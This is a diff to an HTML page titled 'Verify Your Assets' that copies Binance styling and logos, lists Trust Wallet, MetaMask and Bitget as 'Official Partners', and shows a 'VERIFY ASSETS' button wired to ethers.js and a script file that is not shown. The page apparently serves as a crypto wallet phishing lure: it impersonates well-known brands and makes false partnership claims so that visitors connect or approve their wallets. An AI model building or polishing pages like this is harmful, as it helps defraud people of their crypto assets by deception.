@@ -4,48 +4,149 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verify Your Assets</title>
-  <link rel="icon" href="favicon.ico" type="image/x-icon" />
+  <link rel="icon" href="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" type="image/x-icon" />
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #000000, #1a1a1a);
+      font-family: 'Segoe UI', sans-serif;
+      background: #0b0b0b;
       color: #fff;
-      text-align: center;
-      padding-top: 20%;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
     }
-    h1 {
-      font-size: 2em;
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 30px;
+      background: #111;
+      border-bottom: 1px solid #222;
+    }
+
+    header img.logo {
+      height: 40px;
+    }
+
+    .menu {
+      position: relative;
+      display: inline-block;
+    }
+
+    .menu-button {
+      font-size: 24px;
+      cursor: pointer;
       color: #f0b90b;
+      background: none;
+      border: none;
     }
-    p {
+
+    .dropdown {
+      display: none;
+      position: absolute;
+      right: 0;
+      background-color: #1a1a1a;
+      min-width: 140px;
+      border: 1px solid #333;
+      z-index: 1;
+    }
+
+    .dropdown a {
+      color: #f0b90b;
+      padding: 12px 16px;
+      text-decoration: none;
+      display: block;
+    }
+
+    .dropdown a:hover {
+      background-color: #333;
+    }
+
+    .menu:hover .dropdown {
+      display: block;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    main h1 {
+      color: #f0b90b;
+      font-size: 2.2rem;
+    }
+
+    main p {
       color: #ccc;
-      font-size: 1em;
+      margin-bottom: 20px;
     }
-    button {
+
+    .verify-btn {
       background-color: #f0b90b;
       border: none;
       color: black;
-      padding: 15px 30px;
+      padding: 14px 28px;
       font-size: 16px;
-      margin-top: 20px;
       border-radius: 6px;
-      cursor: pointer;
       font-weight: bold;
+      cursor: pointer;
     }
-    button:hover {
-      background-color: #d9a600;
+
+    .verify-btn:hover {
+      background-color: #e0a800;
     }
-    img {
-      margin-bottom: 20px;
+
+    footer {
+      text-align: center;
+      padding: 20px 0;
+      background: #111;
+    }
+
+    .partners {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      margin-top: 10px;
+    }
+
+    .partners img {
+      height: 28px;
+      opacity: 0.9;
     }
   </style>
 </head>
 <body>
-  <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance" width="100" />
-  <h1>Verify Your Assets</h1>
-  <p>To continue, please verify your BNB/USDT wallet</p>
-  <button id="verifyBtn">✅ VERIFY ASSETS</button>
+  <header>
+    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="logo" alt="Logo" />
+    <div class="menu">
+      <button class="menu-button">⋮</button>
+      <div class="dropdown">
+        <a href="#">Contact</a>
+        <a href="#">Deploy</a>
+        <a href="#">Audit</a>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <h1>Verify Your Assets</h1>
+    <p>Ensure your tokens are secure and up-to-date.</p>
+    <button class="verify-btn" id="verifyBtn">✅ VERIFY ASSETS</button>
+  </main>
+
+  <footer>
+    <div>Official Partners</div>
+    <div class="partners">
+      <img src="https://cryptologos.cc/logos/trust-wallet-trust-logo.png" alt="Trust Wallet" />
+      <img src="https://cryptologos.cc/logos/metamask-fox-logo.png" alt="MetaMask" />
+      <img src="https://bitget.com/favicon.ico" alt="Bitget" />
+    </div>
+  </footer>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="script.js"></script>
